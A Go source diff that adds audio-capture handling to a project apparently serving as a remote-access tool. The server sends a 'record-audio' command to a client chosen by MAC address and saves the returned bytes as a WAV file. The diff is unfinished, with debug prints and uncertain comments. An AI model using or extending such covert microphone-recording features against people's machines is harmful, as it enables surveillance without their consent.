@@ -3,6 +3,8 @@ package audio
 import (
 	"context"
 	"fmt"
+	"io/ioutil"
+	"reflect"
 
 	"github.com/justadoll/CHAOS/services/client"
 )
@@ -16,10 +18,17 @@ func NewAudioService(clientService client.Service) Service {
 }
 
 func (u AudioService) Record(ctx context.Context, address string, raw_seconds string) error {
-	if _, err := u.SendCommand(ctx, client.SendCommandInput{
+	resp, err := u.SendCommand(ctx, client.SendCommandInput{
 		MacAddress: address,
 		Request:    fmt.Sprintf("record-audio %s", raw_seconds),
-	}); err != nil {
+	})
+	if err != nil {
+		return err
+	}
+	fmt.Println("resp.Response type: ", reflect.TypeOf(resp.Response)) // string?
+	wav_bytes := []byte(resp.Response)                                 // or encode.StringToByte ?
+
+	if err = ioutil.WriteFile("some_server_file.wav", wav_bytes, 0644); err != nil {
 		return err
 	}
 	return nil
